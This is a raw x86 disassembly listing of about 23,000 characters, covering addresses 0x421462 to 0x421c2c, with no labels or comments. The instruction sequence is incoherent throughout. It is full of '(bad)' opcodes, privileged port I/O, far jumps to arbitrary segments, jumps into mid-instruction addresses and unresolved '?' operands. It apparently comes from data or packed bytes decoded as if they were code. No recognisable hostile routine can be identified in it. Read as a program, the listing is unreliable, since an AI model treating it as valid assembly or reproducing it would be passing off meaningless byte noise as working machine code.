  421462:	xchg   edx,eax
  421463:	(bad)  
  421464:	test   al,0xff
  421466:	adc    BYTE PTR [ebp-0xa],0x3
  42146a:	push   esp
  42146b:	aad    0xe4
  42146d:	jmp    0x421494
  42146f:	pop    ss
  421470:	bnd jae 0x421498
  421473:	pop    esp
  421474:	ja     0x4214db
  421476:	mov    cl,0x78
  421478:	jge    0x421430
  42147a:	jnp    0x42141c
  42147c:	out    0x69,eax
  42147e:	push   ds
  42147f:	cmp    ch,BYTE PTR [ebp-0x1cfbac4a]
  421485:	mov    ecx,0xf5d31ad4
  42148a:	addr16 dec eax
  42148c:	adc    eax,0x6be8fade
  421491:	inc    ebx
  421492:	stos   DWORD PTR es:[edi],eax
  421493:	iret   
  421494:	pop    es
  421495:	adc    al,0x9e
  421497:	aaa    
  421498:	add    edi,DWORD PTR [ecx+0xd25f415]
  42149e:	push   edx
  42149f:	loop   0x4214b7
  4214a1:	fdiv   st(4),st
  4214a3:	lea    edi,[edi]
  4214a5:	fisub  WORD PTR es:[esp+eiz*2]
  4214a9:	and    ch,BYTE PTR [eax+0x45]
  4214ac:	pusha  
  4214ad:	shr    DWORD PTR [esi+eax*2+0x4e],1
  4214b1:	(bad)  
  4214b2:	leave  
  4214b3:	cli    
  4214b4:	pop    ebp
  4214b5:	jl     0x421477
  4214b7:	pop    edx
  4214b8:	in     eax,dx
  4214b9:	aad    0xed
  4214bb:	rol    dh,0x2a
  4214be:	in     eax,0x93
  4214c0:	ins    BYTE PTR es:[edi],dx
  4214c1:	cmp    DWORD PTR ds:[edx+ebx*2-0x6b2704af],0xc0b2f02d
  4214cd:	inc    ebp
  4214ce:	fs pop edi
  4214d0:	cmp    dl,BYTE PTR [ebx-0x7d140169]
  4214d6:	test   eax,0xee9cffd1
  4214db:	jmp    0x421488
  4214dd:	adc    eax,0xc52008be
  4214e2:	xchg   ecx,eax
  4214e3:	ret    
  4214e4:	jp     0x42147e
  4214e6:	add    eax,DWORD PTR [edi+0x66142db]
  4214ec:	gs xchg ebx,eax
  4214ee:	push   ds
  4214ef:	jmp    0x9394c3a2
  4214f4:	pop    ds
  4214f5:	xlat   BYTE PTR gs:[ebx]
  4214f7:	dec    esi
  4214f8:	push   cs
  4214f9:	lds    esp,FWORD PTR [ebx-0x9]
  4214fc:	ds int3 
  4214fe:	pop    esp
  4214ff:	pop    ebp
  421500:	jne    0x42155e
  421502:	and    esp,DWORD PTR [eax-0x19]
  421505:	add    al,0xf2
  421507:	sub    al,0x34
  421509:	retf   0xe6b5
  42150c:	rol    DWORD PTR es:[ecx+edi*8-0x59],cl
  421511:	popa   
  421512:	xchg   DWORD PTR [edx-0x196b8858],esp
  421518:	fild   QWORD PTR [edx]
  42151a:	fsub   st,st(3)
  42151c:	xlat   BYTE PTR ds:[ebx]
  42151d:	(bad)  
  42151e:	int    0x50
  421520:	and    BYTE PTR [ebp*4-0x168e1abc],dh
  421527:	mov    WORD PTR [ecx-0x57dd22cd],cs
  42152d:	std    
  42152e:	pop    edx
  42152f:	mov    ebx,0x2fd84b7a
  421534:	adc    BYTE PTR [edx+0x512eb82],0x52
  42153b:	test   edi,ecx
  42153d:	in     eax,dx
  42153e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42153f:	clc    
  421540:	or     eax,0xab2902f7
  421545:	adc    BYTE PTR [esi-0x79b3c69e],ah
  42154b:	or     al,0x5c
  42154d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42154e:	mov    BYTE PTR [ecx-0x5d],ah
  421551:	mov    ecx,DWORD PTR [eax]
  421553:	cmp    eax,0xd57167b2
  421558:	fcomp  DWORD PTR [eax]
  42155a:	and    DWORD PTR [ebx],0x32b2dc58
  421560:	in     al,dx
  421561:	pusha  
  421562:	pop    ebx
  421563:	jmp    0x16da859b
  421568:	cmp    eax,0x321ed5be
  42156d:	adc    al,0x5
  42156f:	retf   
  421570:	aam    0xc3
  421572:	rcl    DWORD PTR [esi-0x7177c6ab],1
  421578:	cli    
  421579:	in     al,dx
  42157a:	pusha  
  42157b:	lock mov ds:0x4c2b6319,eax
  421581:	xchg   esi,eax
  421582:	push   cs
  421583:	cmp    BYTE PTR [edi-0x2b283685],dh
  421589:	mov    ebx,0xc2a8c40a
  42158e:	rcr    eax,0x18
  421591:	test   eax,0xddc21de8
  421596:	jle    0x4215af
  421598:	mov    edi,0x7bf1a6f2
  42159d:	mov    ecx,0xfb5c2522
  4215a2:	sub    eax,0xe5263c7f
  4215a7:	sub    cl,ah
  4215a9:	scas   eax,DWORD PTR es:[edi]
  4215aa:	pop    ds
  4215ab:	aad    0x74
  4215ad:	imul   edx,DWORD PTR [edi+0xa82ec89],0x409701d0
  4215b7:	pop    edi
  4215b8:	out    dx,eax
  4215b9:	jmp    0x8e9d:0x4ca86d91
  4215c0:	and    eax,0x13e39344
  4215c5:	xchg   edx,eax
  4215c6:	shl    DWORD PTR [eax+0x600d0541],0x0
  4215cd:	mov    ebp,0xb5235faf
  4215d2:	xor    DWORD PTR [ebx-0x1d],0xd56928fe
  4215d9:	ins    DWORD PTR es:[edi],dx
  4215da:	pop    ebx
  4215db:	or     bl,al
  4215dd:	inc    esp
  4215de:	fsubp  st(7),st
  4215e0:	test   al,0x42
  4215e2:	out    0x2,al
  4215e4:	sbb    edx,DWORD PTR [edx]
  4215e6:	mov    WORD PTR [eax+0x64],?
  4215e9:	hlt    
  4215ea:	cmp    BYTE PTR [ebx],cl
  4215ec:	mov    ebp,DWORD PTR [edi]
  4215ee:	inc    edx
  4215ef:	push   0x5dddf144
  4215f4:	les    ebp,FWORD PTR [esi-0x21]
  4215f7:	mov    BYTE PTR [eax+ebp*2],ah
  4215fa:	shl    BYTE PTR [ecx+0x19],0xd3
  4215fe:	in     eax,dx
  4215ff:	les    esi,FWORD PTR [edi-0x307a0e6e]
  421605:	cmp    al,dh
  421607:	ret    
  421608:	push   0xffffffd7
  42160a:	jns    0x42160d
  42160c:	ja     0x421622
  42160e:	mov    edi,0x9f544285
  421613:	push   0x46
  421615:	dec    ebp
  421616:	mov    dl,0xf1
  421618:	mov    dh,BYTE PTR [ecx-0x34]
  42161b:	lods   eax,DWORD PTR ds:[esi]
  42161c:	pop    esp
  42161d:	sbb    DWORD PTR [ebp+0x33],0x92b2798b
  421624:	sbb    edx,DWORD PTR [ebx-0x1d2a723b]
  42162a:	add    BYTE PTR [edi+0x5f],bl
  42162d:	adc    ecx,esp
  42162f:	in     al,dx
  421630:	ja     0x421655
  421632:	jnp    0x42162b
  421634:	imul   ebp,DWORD PTR [ebp-0x1dcb2365],0x69b25d03
  42163e:	call   0x1454de45
  421643:	loop   0x4215e3
  421645:	cmp    edi,edx
  421647:	push   esi
  421648:	mov    ebx,0x50da2e74
  42164d:	stos   DWORD PTR es:[edi],eax
  42164e:	ja     0x42169a
  421650:	jb     0x4215e5
  421652:	cs out 0xf,al
  421655:	stc    
  421656:	add    ecx,DWORD PTR [ecx]
  421658:	push   cs
  421659:	out    0xe0,al
  42165b:	sub    BYTE PTR [edi-0xc],0xae
  42165f:	mov    WORD PTR [esi+0x32672cef],?
  421665:	imul   eax,edx,0xffffffa1
  421668:	xor    al,0xdb
  42166a:	adc    eax,0x65797276
  42166f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421670:	jge    0x421669
  421672:	xchg   esp,eax
  421673:	daa    
  421674:	in     al,0x48
  421676:	sub    ebp,ebx
  421678:	loopne 0x42165b
  42167a:	ret    0xe332
  42167d:	push   edx
  42167e:	sub    BYTE PTR [edx],dh
  421680:	inc    ebp
  421681:	lahf   
  421682:	mov    ch,0xfb
  421684:	scas   al,BYTE PTR es:[edi]
  421685:	ins    BYTE PTR es:[edi],dx
  421686:	mov    al,0x26
  421688:	lahf   
  421689:	aad    0x80
  42168b:	ret    
  42168c:	sbb    di,WORD PTR cs:[ebx-0x55]
  421691:	icebp  
  421692:	cmp    eax,0xb2e40f2e
  421697:	jno    0xe14dd847
  42169d:	enter  0x66d0,0x51
  4216a1:	mov    al,ds:0xdd90c7df
  4216a6:	dec    edx
  4216a7:	mov    dh,0xb
  4216a9:	sub    esi,eax
  4216ab:	and    DWORD PTR [edx+ebx*8-0x2516542e],ebp
  4216b2:	pop    edx
  4216b3:	adc    eax,0xb7807eee
  4216b8:	mov    edi,0xa32f4562
  4216bd:	aas    
  4216be:	push   0xeed6647b
  4216c3:	sub    ch,bh
  4216c5:	and    esi,eax
  4216c7:	je     0x4216ef
  4216c9:	sub    BYTE PTR [ebx-0x4f],0xdd
  4216cd:	ins    DWORD PTR es:[edi],dx
  4216ce:	or     BYTE PTR [ecx],bl
  4216d0:	daa    
  4216d1:	call   0xbad77879
  4216d6:	aaa    
  4216d7:	cmp    BYTE PTR [edx],ch
  4216d9:	adc    BYTE PTR [ebp-0x2516d96e],dl
  4216df:	es adc edi,esp
  4216e2:	inc    esi
  4216e3:	fistp  DWORD PTR es:[edx]
  4216e6:	mov    dl,0xf9
  4216e8:	ins    DWORD PTR es:[edi],dx
  4216e9:	add    BYTE PTR [ebp+0x662c6d5e],cl
  4216ef:	mov    esp,0xd427293d
  4216f4:	ds xchg esi,eax
  4216f6:	lds    ebx,FWORD PTR [ecx+0x34d86dba]
  4216fc:	cmc    
  4216fd:	rcl    DWORD PTR [ecx-0x23e60a4a],cl
  421703:	ficomp WORD PTR [ebx]
  421705:	dec    edi
  421706:	sbb    al,0xba
  421708:	jmp    0x874488d6
  42170d:	arpl   bp,di
  42170f:	mov    ebp,0x68427e6e
  421714:	iret   
  421715:	mov    ch,0x63
  421717:	inc    eax
  421718:	mov    ebp,0x6ab6e70f
  42171d:	out    0x48,al
  42171f:	in     eax,dx
  421720:	jne    0x4216a9
  421722:	jbe    0x421713
  421724:	pop    ebx
  421725:	xor    DWORD PTR [edi+0x571c55d8],esi
  42172b:	aad    0xb9
  42172d:	xor    edx,DWORD PTR [edx+0x535cf4c]
  421733:	scas   al,BYTE PTR es:[edi]
  421734:	push   ebx
  421735:	xchg   DWORD PTR [esi+0x24dcb153],eax
  42173b:	int3   
  42173c:	mov    cl,0x46
  42173e:	dec    esp
  42173f:	fs ja  0x42175d
  421742:	add    al,0x8f
  421744:	mov    ch,bh
  421746:	cdq    
  421747:	xchg   esp,eax
  421748:	loopne 0x42179a
  42174a:	pop    es
  42174b:	int    0xe5
  42174d:	mov    dl,0x9b
  42174f:	mov    BYTE PTR [eax+esi*8+0x2a],ch
  421753:	stos   DWORD PTR es:[edi],eax
  421754:	or     eax,0x892c339c
  421759:	jae    0x421777
  42175b:	popa   
  42175c:	jg     0x42174b
  42175e:	pushf  
  42175f:	loope  0x421747
  421761:	test   al,0xbf
  421763:	int3   
  421764:	call   0x4649673a
  421769:	(bad)  
  42176a:	mov    esi,0xf756e186
  42176f:	jle    0x421735
  421771:	fmul   st(2),st
  421773:	cmc    
  421774:	jae    0x421722
  421776:	and    al,0xe5
  421778:	stc    
  421779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42177a:	push   ebp
  42177b:	sahf   
  42177c:	inc    ecx
  42177d:	in     al,dx
  42177e:	retf   
  42177f:	mov    esi,0x15507955
  421784:	ds mov edx,0x675f1ed1
  42178a:	arpl   bx,sp
  42178c:	loopne 0x421749
  42178e:	dec    edx
  42178f:	or     BYTE PTR [ebp+0xe],0x27
  421793:	outs   dx,BYTE PTR ds:[esi]
  421794:	cli    
  421795:	icebp  
  421796:	xor    al,0xcf
  421798:	out    dx,al
  421799:	neg    BYTE PTR [edi+0x1d]
  42179c:	push   ds
  42179d:	xchg   ebp,eax
  42179e:	or     DWORD PTR [ebx-0x33],edi
  4217a1:	mov    ch,0xd6
  4217a3:	xchg   edi,eax
  4217a4:	ret    0x502b
  4217a7:	push   ds
  4217a8:	cmp    eax,0xc2828e0e
  4217ad:	jl     0x42180d
  4217af:	je     0x42181b
  4217b1:	xchg   BYTE PTR [ecx-0x526b798e],dl
  4217b7:	push   0xffffffb6
  4217b9:	neg    BYTE PTR [edi+0x34ae5c82]
  4217bf:	dec    ebx
  4217c0:	and    BYTE PTR [ecx+0x2d],dh
  4217c3:	call   esp
  4217c5:	sbb    ch,ah
  4217c7:	mov    ch,0xb2
  4217c9:	pop    ebx
  4217ca:	push   ebx
  4217cb:	lods   eax,DWORD PTR ds:[esi]
  4217cc:	into   
  4217cd:	stc    
  4217ce:	data16 ins BYTE PTR es:[edi],dx
  4217d0:	leave  
  4217d1:	push   ds
  4217d2:	xlat   BYTE PTR ds:[ebx]
  4217d3:	inc    eax
  4217d4:	loop   0x4217de
  4217d6:	sti    
  4217d7:	pop    edi
  4217d8:	inc    ecx
  4217d9:	scas   al,BYTE PTR es:[edi]
  4217da:	fwait
  4217db:	imul   ebx,DWORD PTR [ebx+0x3c],0x8
  4217df:	imul   ebx,DWORD PTR [eax+eiz*8-0x1472289d],0xffffffc8
  4217e7:	cli    
  4217e8:	rol    BYTE PTR [ebp+0x5b],1
  4217eb:	scas   eax,DWORD PTR es:[edi]
  4217ec:	pop    edi
  4217ed:	jbe    0x4217a9
  4217ef:	fstp   DWORD PTR [edx-0x52fbb873]
  4217f5:	js     0x42181e
  4217f7:	jno    0x4217b9
  4217f9:	jno    0x421869
  4217fb:	inc    edi
  4217fc:	mov    esp,DWORD PTR ds:0xdc19dd8d
  421802:	lock sub BYTE PTR [eax+0x64742b2c],0xbd
  42180a:	sub    al,0x3b
  42180c:	xor    al,0x87
  42180e:	loopne 0x4217d1
  421810:	mov    esp,eax
  421812:	out    dx,eax
  421813:	js     0x4217c4
  421815:	(bad)
  421818:	inc    ebp
  421819:	(bad)  
  42181a:	pop    edx
  42181b:	rol    ebp,1
  42181d:	push   cs
  42181e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  421820:	ins    BYTE PTR es:[edi],dx
  421821:	aaa    
  421822:	sub    dl,BYTE PTR [ebx+ebp*2]
  421825:	push   ebx
  421826:	addr16 inc ebx
  421828:	push   ss
  421829:	inc    ebp
  42182a:	pop    ebx
  42182b:	cmp    cl,BYTE PTR [ecx+0x3f]
  42182e:	sub    BYTE PTR [edx+0x6c6c3bfb],ah
  421834:	retf   0xdb7
  421837:	fwait
  421838:	inc    esi
  421839:	or     ch,BYTE PTR [ecx]
  42183b:	scas   al,BYTE PTR es:[edi]
  42183c:	push   ss
  42183d:	iret   
  42183e:	stc    
  42183f:	mov    al,0xd1
  421841:	mov    edx,0xe008be92
  421846:	repz mov WORD PTR [ecx-0x2f],?
  42184a:	scas   eax,DWORD PTR es:[edi]
  42184b:	stos   DWORD PTR es:[edi],eax
  42184c:	dec    edx
  42184d:	and    esi,DWORD PTR [esi]
  42184f:	leave  
  421850:	pop    ecx
  421851:	push   ebx
  421852:	ror    esi,0x3
  421855:	add    eax,0x35ec278b
  42185a:	es mov edx,0x96e131fa
  421860:	jbe    0x4218a5
  421862:	add    dl,0x44
  421865:	mov    ebx,DWORD PTR [ecx-0x61]
  421868:	cs mov al,0x9e
  42186b:	out    0x83,eax
  42186d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42186e:	pop    ebp
  42186f:	mov    esi,0xd65b0256
  421874:	ud2    
  421876:	mov    ds:0xf1c66f4b,eax
  42187b:	mov    WORD PTR [ebp+0x71c9cfb3],ss
  421881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421882:	out    dx,eax
  421883:	pop    ebx
  421884:	sti    
  421885:	jb     0x4218f7
  421887:	push   es
  421888:	fadd   DWORD PTR ds:0x305ae794
  42188e:	and    BYTE PTR [esi+0xba82df9],0xf3
  421895:	das    
  421896:	es sbb al,0xb2
  421899:	addr16 stc 
  42189b:	jmp    0xcd9b:0xe8f61633
  4218a2:	jmp    0x3636:0xed1bd7c
  4218a9:	jbe    0x4218b7
  4218ab:	cdq    
  4218ac:	mov    eax,0xc33c2cd5
  4218b1:	jne    0x421844
  4218b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b4:	mov    cl,0xfa
  4218b6:	arpl   WORD PTR [edx-0x2e],sp
  4218b9:	xlat   BYTE PTR ds:[ebx]
  4218ba:	sbb    DWORD PTR [ecx+0x4f],0x8a3a8237
  4218c1:	sbb    al,BYTE PTR [edx-0x4aa1e4df]
  4218c7:	sti    
  4218c8:	cs xchg esp,eax
  4218ca:	cmp    ebp,DWORD PTR [esi]
  4218cc:	sar    esp,cl
  4218ce:	je     0x4218de
  4218d0:	retf   0x49a0
  4218d3:	ins    DWORD PTR es:[edi],dx
  4218d4:	lock xchg ebx,eax
  4218d6:	das    
  4218d7:	scas   al,BYTE PTR es:[edi]
  4218d8:	or     al,BYTE PTR [edx+0x6e38233f]
  4218de:	or     esi,DWORD PTR [edx-0x63832df8]
  4218e4:	or     BYTE PTR [esp+edi*4+0x5d],dh
  4218e8:	leave  
  4218e9:	imul   ebx,DWORD PTR [esi],0x90a83bde
  4218ef:	xor    dh,BYTE PTR [ebx]
  4218f1:	nop
  4218f2:	lahf   
  4218f3:	pop    esi
  4218f4:	outs   dx,BYTE PTR ds:[esi]
  4218f5:	cmp    al,0x45
  4218f7:	dec    esi
  4218f8:	cmp    BYTE PTR [esi-0x3d1d81cb],dh
  4218fe:	inc    esi
  4218ff:	dec    esi
  421900:	mov    ch,0x71
  421902:	add    eax,0xee5e5688
  421907:	push   edi
  421908:	push   ebx
  421909:	inc    ebx
  42190a:	sar    BYTE PTR [edx+0x64],1
  42190d:	pop    es
  42190e:	jns    0x421953
  421910:	and    eax,0xfe28c34d
  421915:	pop    ds
  421916:	repz fldcw WORD PTR [esi+ecx*8]
  42191a:	or     eax,0x9b41581f
  42191f:	ss pop ss
  421921:	loop   0x4218ac
  421923:	std    
  421924:	in     al,0xff
  421926:	repz push 0xffffffac
  421929:	and    al,0xa3
  42192b:	cmp    esp,ecx
  42192d:	test   DWORD PTR [ecx+edi*4],edi
  421930:	xor    cl,dl
  421932:	pop    ss
  421933:	dec    ebp
  421934:	push   esi
  421935:	mov    esi,0x3d008237
  42193a:	dec    ecx
  42193b:	fadd   DWORD PTR [eax+0x54dc8cc4]
  421941:	mov    ecx,0x33a8bc1d
  421946:	cs out dx,al
  421948:	iret   
  421949:	sbb    dh,BYTE PTR [edi+0x526a481f]
  42194f:	pop    esi
  421950:	sub    BYTE PTR [ebx+eax*4+0x76],0x49
  421955:	sbb    BYTE PTR [ecx-0x4f],bh
  421958:	(bad)  
  421959:	fild   WORD PTR [esi-0x7d22839c]
  42195f:	sti    
  421960:	ret    0x2730
  421963:	aad    0x6c
  421965:	mov    ecx,0x1f9638a3
  42196a:	xor    al,0x16
  42196c:	dec    edi
  42196d:	add    ebp,DWORD PTR [eax+0x1f2793cf]
  421973:	add    DWORD PTR [esi+0x6d],ebp
  421976:	ja     0x421967
  421978:	enter  0x3de,0xdf
  42197c:	xchg   esi,eax
  42197d:	and    ah,BYTE PTR [ebp+0x76]
  421980:	cs dec eax
  421982:	retf   
  421983:	lock push es
  421985:	inc    esi
  421986:	pop    ebp
  421987:	not    DWORD PTR [ebp+0x43]
  42198a:	jmp    0xd6636bcb
  42198f:	cmp    BYTE PTR [eax],dh
  421991:	call   0xe0c0:0xfc261558
  421998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421999:	sahf   
  42199a:	(bad)  
  42199b:	sub    al,0x28
  42199d:	(bad)  
  42199e:	loop   0x421a15
  4219a0:	push   edi
  4219a1:	pop    ebp
  4219a2:	inc    esi
  4219a3:	mov    ah,0x26
  4219a5:	clc    
  4219a6:	fs inc ecx
  4219a8:	pusha  
  4219a9:	mov    WORD PTR [ebp-0x37],?
  4219ac:	into   
  4219ad:	test   BYTE PTR [ebx-0x66f550d4],al
  4219b3:	mov    ds:0xa95cee7b,eax
  4219b8:	sti    
  4219b9:	sub    DWORD PTR [edi+eax*2],eax
  4219bc:	aad    0x92
  4219be:	push   es
  4219bf:	fcomp  DWORD PTR [eax-0x5f]
  4219c2:	adc    al,0xf1
  4219c4:	pop    edx
  4219c5:	inc    esp
  4219c6:	mov    al,0x9a
  4219c8:	push   ebp
  4219c9:	sar    DWORD PTR [ebx],cl
  4219cb:	daa    
  4219cc:	inc    esi
  4219cd:	int    0xa
  4219cf:	sbb    bh,bh
  4219d1:	add    BYTE PTR [eax-0x7e],al
  4219d4:	xor    edx,DWORD PTR [eax+esi*1]
  4219d7:	cmc    
  4219d8:	cmp    DWORD PTR [esi+0x1778f6a7],edi
  4219de:	arpl   WORD PTR [edi+ebx*8+0x36],bx
  4219e2:	add    esp,DWORD PTR [esi-0x6d]
  4219e5:	mul    eax
  4219e7:	pop    ebp
  4219e8:	mov    bh,0x2d
  4219ea:	mov    bl,0x18
  4219ec:	ror    BYTE PTR [ecx+0x139d3829],1
  4219f2:	test   al,0x86
  4219f4:	bound  ecx,QWORD PTR [ebx]
  4219f6:	shr    BYTE PTR [ebx],0x6c
  4219f9:	adc    eax,0x6f149cd9
  4219fe:	mov    esi,0x37af7cd9
  421a03:	mov    ds:0x2ac8c37f,eax
  421a08:	fst    QWORD PTR [esi+0xe0cf45d]
  421a0e:	cmp    BYTE PTR [edx],bh
  421a10:	(bad)  
  421a14:	push   es
  421a15:	arpl   WORD PTR [esi],bp
  421a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a18:	scas   al,BYTE PTR es:[edi]
  421a19:	cli    
  421a1a:	dec    esp
  421a1b:	in     eax,0xc3
  421a1d:	ror    DWORD PTR [edx+0x5701e719],0x1e
  421a24:	xlat   BYTE PTR ds:[ebx]
  421a25:	fbstp  TBYTE PTR [esi]
  421a27:	retf   
  421a28:	in     eax,dx
  421a29:	js     0x421a8d
  421a2b:	jmp    0x421a5a
  421a2d:	cld    
  421a2e:	push   ecx
  421a2f:	lods   al,BYTE PTR ds:[esi]
  421a30:	hlt    
  421a31:	nop
  421a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a34:	push   es
  421a35:	xor    ecx,ebx
  421a37:	mov    cl,0x13
  421a39:	cwde   
  421a3a:	repz jge 0x4219c2
  421a3d:	and    edi,DWORD PTR [edi]
  421a3f:	sub    al,0xec
  421a41:	pop    es
  421a42:	xor    edx,DWORD PTR [edi+0x7d518e5a]
  421a48:	js     0x421a82
  421a4a:	test   DWORD PTR [esi+0x2b6f0b16],0xd4706805
  421a54:	adc    al,0xe1
  421a56:	sti    
  421a57:	aam    0xb1
  421a59:	inc    ecx
  421a5a:	mov    ecx,0x8c0a08f
  421a5f:	mov    cl,0xd5
  421a61:	arpl   WORD PTR [ebx+0x33afa1ff],si
  421a67:	xchg   ebx,eax
  421a68:	(bad)
  421a6e:	je     0x421aeb
  421a70:	loope  0x421ae7
  421a72:	push   ebx
  421a73:	les    ebx,FWORD PTR [edx]
  421a75:	push   ecx
  421a76:	inc    esi
  421a77:	push   esi
  421a78:	add    eax,0x7356f3cc
  421a7d:	(bad)  
  421a7e:	fwait
  421a7f:	pop    es
  421a80:	add    bl,BYTE PTR [ebx+0x3e]
  421a83:	add    dh,BYTE PTR [esi+eax*2-0x41b150be]
  421a8a:	std    
  421a8b:	ds mov bl,0xf4
  421a8e:	mov    ebx,0x2c845b83
  421a93:	outs   dx,BYTE PTR ds:[esi]
  421a94:	repnz mov ebx,DWORD PTR [esp+edi*4+0x7a529e00]
  421a9c:	(bad)  
  421a9d:	fsubr  QWORD PTR es:[edi]
  421aa0:	into   
  421aa1:	adc    dl,BYTE PTR [esi+0x76cdc42d]
  421aa7:	test   BYTE PTR [esi+0x61eb31ee],bh
  421aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aae:	cmp    bh,BYTE PTR [ebx-0x18]
  421ab1:	mov    esi,0x3a3596ce
  421ab6:	jne    0x421a61
  421ab8:	add    BYTE PTR [eax+0xb],ah
  421abb:	push   eax
  421abc:	xchg   edx,eax
  421abd:	xchg   esi,eax
  421abe:	retf   0x650c
  421ac1:	out    dx,eax
  421ac2:	scas   eax,DWORD PTR es:[edi]
  421ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ac4:	pop    edx
  421ac5:	imul   edi,DWORD PTR [eax+0x5f],0x10
  421ac9:	dec    ecx
  421aca:	or     ah,ch
  421acc:	push   cs
  421acd:	inc    esp
  421ace:	stc    
  421acf:	out    0xe0,al
  421ad1:	mov    WORD PTR [ebx-0x1],es
  421ad4:	js     0x421b20
  421ad6:	in     al,0xfe
  421ad8:	shr    DWORD PTR [esi-0x15],1
  421adb:	dec    eax
  421adc:	ror    DWORD PTR ds:0x1b997d78,cl
  421ae2:	ja     0x421ad4
  421ae4:	cmp    bl,BYTE PTR es:[edi]
  421ae7:	lods   al,BYTE PTR ds:[esi]
  421ae8:	shr    edx,cl
  421aea:	mov    ch,0xd6
  421aec:	cvtps2pd xmm2,QWORD PTR [ecx+0x1d]
  421af0:	mov    ds:0x9e151eb6,eax
  421af5:	adc    DWORD PTR [ebp+ecx*2-0x796bc1f1],edx
  421afc:	test   eax,0x9bcae0f6
  421b01:	inc    ebx
  421b02:	sub    DWORD PTR [esi*2-0x34e2ab01],0xffffff98
  421b0a:	inc    eax
  421b0b:	jno    0x421ac6
  421b0d:	cmp    DWORD PTR ss:[eax-0x7c2f2d1f],edi
  421b14:	sbb    BYTE PTR [edx],cl
  421b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b17:	cmp    ebx,eax
  421b19:	mov    al,0xb5
  421b1b:	jne    0x421b10
  421b1d:	hlt    
  421b1e:	leave  
  421b1f:	leave  
  421b20:	adc    dh,cl
  421b22:	adc    BYTE PTR [eax+0x74],ah
  421b25:	inc    ebx
  421b26:	pop    esp
  421b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b28:	jnp    0x421b7b
  421b2a:	stos   BYTE PTR es:[edi],al
  421b2b:	or     bl,BYTE PTR [ebp-0x22]
  421b2e:	adc    DWORD PTR [esp+esi*2-0x28a85973],edi
  421b35:	xchg   ecx,eax
  421b36:	sbb    ah,BYTE PTR [esi-0x6cd04d54]
  421b3c:	xor    al,0x37
  421b3e:	aaa    
  421b3f:	mov    bl,0xa9
  421b41:	fstp   TBYTE PTR [ebx-0x5]
  421b44:	add    eax,0xc38ea7b4
  421b49:	dec    edx
  421b4a:	cmp    eax,0xddc8efa
  421b4f:	in     al,0x5f
  421b51:	call   0x554ea55c
  421b56:	xchg   edx,eax
  421b57:	dec    eax
  421b58:	jns    0x421b2a
  421b5a:	pop    ebp
  421b5b:	iret   
  421b5c:	pop    es
  421b5d:	cmp    eax,0x905b5b93
  421b62:	push   ds
  421b63:	stc    
  421b64:	inc    edi
  421b65:	push   0x3fcdb9dd
  421b6a:	jle    0x421b5a
  421b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b6d:	js     0x421b6c
  421b6f:	aam    0x8c
  421b71:	loope  0x421af7
  421b73:	shl    DWORD PTR [ebp-0x502814b8],1
  421b79:	in     eax,0xfe
  421b7b:	in     eax,dx
  421b7c:	pop    ss
  421b7d:	xchg   edi,eax
  421b7e:	xor    BYTE PTR [esi-0x5f05e2ed],dl
  421b84:	and    dl,BYTE PTR [ecx*2+0x7bad73e5]
  421b8b:	dec    eax
  421b8c:	push   edx
  421b8d:	sub    BYTE PTR [ecx+0x2d],0x26
  421b91:	shl    DWORD PTR [ebx],cl
  421b93:	mov    esi,0xd2502718
  421b98:	mov    cl,0x4
  421b9a:	dec    esi
  421b9b:	push   ss
  421b9c:	xchg   edx,eax
  421b9d:	adc    eax,0xf11f073
  421ba2:	pop    eax
  421ba3:	mov    esp,0x30cb651a
  421ba8:	push   esp
  421ba9:	pop    esp
  421baa:	(bad)  
  421bab:	cwde   
  421bac:	test   dl,0x9f
  421baf:	nop
  421bb0:	mov    edx,0xfa0ac953
  421bb5:	mov    eax,ds:0xd92c4bbf
  421bba:	inc    ebx
  421bbb:	mov    bh,0x4e
  421bbd:	push   ss
  421bbe:	in     eax,0xda
  421bc0:	xchg   ebp,eax
  421bc1:	es sub al,0x20
  421bc4:	into   
  421bc5:	or     edi,DWORD PTR [ecx+0x76a6df1b]
  421bcb:	outs   dx,DWORD PTR ds:[esi]
  421bcc:	add    esi,DWORD PTR [ecx-0xba2737c]
  421bd2:	sbb    BYTE PTR [edx],0xe0
  421bd5:	cmp    al,0x92
  421bd7:	repnz inc eax
  421bd9:	stos   BYTE PTR es:[edi],al
  421bda:	lahf   
  421bdb:	and    al,BYTE PTR [edi]
  421bdd:	cmp    eax,0x10a87ae7
  421be2:	jno    0x421c52
  421be4:	test   BYTE PTR [edi-0x59c1f61e],0x1f
  421beb:	js     0x421ba9
  421bed:	dec    esp
  421bee:	aad    0xb8
  421bf0:	nop
  421bf1:	mov    al,ds:0x7daa7964
  421bf6:	mov    DWORD PTR [esi-0x48],esi
  421bf9:	pop    ecx
  421bfa:	and    BYTE PTR ds:0x79f6a2e7,bl
  421c00:	in     al,0x3c
  421c02:	sahf   
  421c03:	in     eax,dx
  421c04:	sub    al,0x65
  421c06:	daa    
  421c07:	or     dl,dh
  421c09:	jb     0x421c52
  421c0b:	les    esi,FWORD PTR [edx+ecx*8+0x7c076559]
  421c12:	rcl    DWORD PTR [eax],1
  421c14:	mov    ebx,0xed491537
  421c19:	dec    ebp
  421c1a:	repnz pusha 
  421c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c1d:	mov    cs,WORD PTR [edi-0x7bd12dc7]
  421c23:	repz scas al,BYTE PTR es:[edi]
  421c25:	fwait
  421c26:	mov    ds:0x22668097,eax
  421c2b:	pop    ecx
  421c2c:	pop    ebp
